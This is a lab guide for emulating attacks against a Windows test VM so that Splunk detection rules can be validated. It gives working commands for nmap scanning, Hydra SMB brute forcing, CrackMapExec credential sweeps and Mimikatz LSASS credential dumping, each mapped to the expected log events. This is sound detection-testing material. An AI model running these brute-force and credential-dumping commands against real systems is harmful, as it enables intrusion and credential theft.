# ⚔️ Lab Guide 03: Kali Linux Adversary Emulation & Simulation Guide

This guide walks through reproducing offensive tactics against the Windows target VM to validate detection rules.

---

## 1. Network Reconnaissance (MITRE T1595)

From your Kali Linux attacker VM, scan open ports on the target Windows machine:
```bash
nmap -sS -sV -p 135,139,445,3389,5985 192.168.1.50
```
- **Generated Logs:** Firewall drops, connection attempts, Sysmon Event 3.

---

## 2. SMB Brute Force & Password Spraying (MITRE T1110.001)

Run Hydra against SMB to generate failed logon telemetry (Event ID 4625):
```bash
hydra -l john.doe -P /tmp/passwords_test.txt smb://192.168.1.50 -V -t 4
```
- **Generated Logs:** High velocity of Event Code 4625 with Sub_Status `0xC000006A`.
- **Validation:** Verify alert `SOC - Brute Force Password Spraying Detected` fires in Splunk.

---

## 3. Lateral Movement via CrackMapExec / SMB (MITRE T1021.002)

Authenticate using valid credentials and enumerate shares across multiple targets:
```bash
crackmapexec smb 192.168.1.0/24 -u john.doe -p 'Summer2024!' --shares
```
- **Generated Logs:** Event 4624 (Logon Type 3) occurring on multiple endpoints from the same source IP.
- **Validation:** Verify `SOC - Lateral Movement Detected` alert fires in Splunk.

---

## 4. Credential Dumping via Mimikatz (MITRE T1003.001)

On the Windows target VM, run Mimikatz in an elevated command prompt:
```cmd
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```
- **Generated Logs:** Sysmon Event ID 10 with TargetImage `*lsass.exe` and GrantedAccess `0x1010` / `0x1F0FFF`.
- **Validation:** Verify `SOC - Credential Dumping - LSASS Process Access` alert fires in Splunk.
